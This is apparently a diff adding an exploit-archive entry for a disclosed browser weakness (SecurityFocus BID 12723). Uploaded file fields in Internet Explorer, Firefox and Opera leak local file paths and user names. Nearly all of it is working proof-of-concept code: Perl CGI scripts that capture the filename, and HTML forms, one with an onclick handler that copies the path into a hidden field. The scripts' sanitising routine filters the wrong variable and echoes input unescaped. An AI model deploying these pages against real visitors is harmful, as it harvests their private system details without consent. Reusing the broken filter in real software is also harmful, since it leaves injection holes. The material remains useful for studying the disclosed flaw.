@@ -1,0 +1,157 @@
+source: http://www.securityfocus.com/bid/12723/info
+
+Multiple browsers are reported prone to an information disclosure weakness. This issue can allow an attacker to determine information such as the location of files, file names and user names on a vulnerable computer. Information gathered through the exploitation of this weakness may aid in other attacks against the computer.
+
+This weakness has been identified in Microsoft Internet Explorer, Mozilla Firefox, and Opera. 
+
+server-side Perl CGI.(ask.cgi)
+- ---------------------------
+#!/usr/bin/perl
+print "Content-Type: text/html\n\n";
+
+die if $ENV{CONTENT_LENGTH} > 100*1024;
+
+$objectname = "RFC1867";
+$boundary = <STDIN>;
+$boundary =~s /\r\n//;
+while(<STDIN>){
+if($_ =~ /$objectname/){
+~s/\r\n//;
+~s/"//g;
+@dum = split(/filename=/, $_);
+$rfc1867 = $dum[@dum - 1];
+}
+}
+&Filtertxt( $rfc1867 );
+print "$rfc1867\n";
+
+exit(0);
+
+sub Filtertxt {
+local( $ft ) = @_;
+$fd =~ s/[\<\>\"\'\%\;\)\(\&\+]//g;
+return( $ft ) ;
+}
+- ---------------------------
+
+client-side FORM.
+- ---------------------------
+<form name="XA" method="POST" enctype="multipart/form-data"
+action="http://www.example.com/cgi-bin/ask.cgi">
+<input type="file" name="RFC1867">
+<input type="hidden" name="XB" value="HIDDEN">
+<input type=submit value="Upload">
+</form>
+
+Targeting Internet Explorer and Opera:
+
+server-side Perl CGI.(named ask2.cgi)
+- ---------------------------
+#!/usr/bin/perl
+
+if($ENV{'REQUEST_METHOD'} eq 'POST'){
+#reads inputted variables through POST
+read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
+}
+else{
+#reads inputted variables through GET
+$buffer = $ENV{'QUERY_STRING'};
+}
+
+#splits the variables at &
+@pairs = split(/&/, $buffer);
+foreach $pair (@pairs) {
+#sets the value and name of each var
+($name, $value) = split(/=/, $pair);
+#makes each + into a space
+$value =~ tr/+/ /;
+#URL decode
+$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+#filter out bad characters & # < > " '
+$value = &Filtertxt( $value );
+#sets the varibles in a hash
+$FORM{$name} = $value;
+}
+
+#print html .
+print "Content-Type: text/html\n";
+print "\n";
+print "$FORM{'XB'}\n";
+print "<br>\n";
+print "$FORM{'RFC1867'}\n";
+
+exit(0);
+
+sub Filtertxt {
+local( $ft ) = @_;
+$fd =~ s/[\<\>\"\'\%\;\)\(\&\+]//g;
+return( $ft ) ;
+}
+- ---------------------------
+
+client-side FORM.
+- ---------------------------
+<form name="XA" method="GET" enctype="multipart/form-data"
+action="http://www.example.com/cgi-bin/ask2.cgi">
+<input type="file" name="RFC1867">
+<input type="hidden" name="XB" value="HIDDEN">
+<input type=submit value="Upload">
+</form>
+- ---------------------------
+
+Targeting Firefox, Internet Explorer and Opera:
+
+server-side Perl CGI.(named ask2.cgi)
+- ---------------------------
+#!/usr/bin/perl
+
+if($ENV{'REQUEST_METHOD'} eq 'POST'){
+#reads inputted variables through POST
+read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
+}
+else{
+#reads inputted variables through GET
+$buffer = $ENV{'QUERY_STRING'};
+}
+
+#splits the variables at &
+@pairs = split(/&/, $buffer);
+foreach $pair (@pairs) {
+#sets the value and name of each var
+($name, $value) = split(/=/, $pair);
+#makes each + into a space
+$value =~ tr/+/ /;
+#URL decode
+$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+#filter out bad characters & # < > " '
+$value = &Filtertxt( $value );
+#sets the varibles in a hash
+$FORM{$name} = $value;
+}
+
+#print html .
+print "Content-Type: text/html\n";
+print "\n";
+print "$FORM{'XB'}\n";
+print "<br>\n";
+print "$FORM{'RFC1867'}\n";
+
+exit(0);
+
+sub Filtertxt {
+local( $ft ) = @_;
+$fd =~ s/[\<\>\"\'\%\;\)\(\&\+]//g;
+return( $ft ) ;
+}
+- ---------------------------
+
+client-side FORM.
+- ---------------------------
+<form name="XA" method="GET" enctype="multipart/form-data"
+action="http://www.example.com/cgi-bin/ask2.cgi">
+<input type="file" name="RFC1867">
+<input type="hidden" name="XB" value="HIDDEN">
+<input type=submit value="Upload"
+onclick="document.XA.XB.value=document.XA.RFC1867.value;return true" >
+</form>
+- --------------------------- 
